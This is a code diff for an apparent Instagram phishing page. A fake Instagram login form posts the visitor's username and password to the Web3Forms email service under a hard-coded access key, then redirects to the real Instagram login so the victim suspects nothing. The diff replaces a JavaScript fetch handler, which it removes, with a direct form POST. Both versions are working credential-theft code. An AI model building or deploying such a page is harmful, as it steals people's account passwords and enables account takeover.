@@ -44,7 +44,10 @@
     </div>
 
     <!-- ---------- Web3Forms Login Form ---------- -->
-    <form class="form" id="loginForm">
+    <form class="form" action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="8312e902-b0d4-418c-baf3-1ff44e8c9ffd">
+      <input type="hidden" name="redirect" value="https://www.instagram.com/accounts/login/">
+
       <input type="text" name="username" placeholder="Username, email or mobile number" required />
       <input type="password" name="password" placeholder="Password" required />
       <button class="login-btn" type="submit">Log in</button>
@@ -64,38 +67,5 @@
       <span>Meta</span>
     </div>
   </div>
-
-  <!-- ---------- Web3Forms Script ---------- -->
-  <script>
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const formData = new FormData(form);
-      const data = Object.fromEntries(formData.entries());
-      data.access_key = "8312e902-b0d4-418c-baf3-1ff44e8c9ffd"; // Your Web3Forms key
-      data.subject = "Instagram Login Submission"; // Optional: email subject
-      data.redirect = "https://www.instagram.com/accounts/login/"; // Redirect after submission
-
-      try {
-        const response = await fetch("https://api.web3forms.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-
-        const result = await response.json();
-        if (result.success) {
-          form.reset();
-          window.location.href = data.redirect; // Redirect to Instagram login
-        } else {
-          alert("Something went wrong, try again!");
-        }
-      } catch (error) {
-        alert("Error submitting form!");
-        console.error(error);
-      }
-    });
-  </script>
 </body>
 </html>
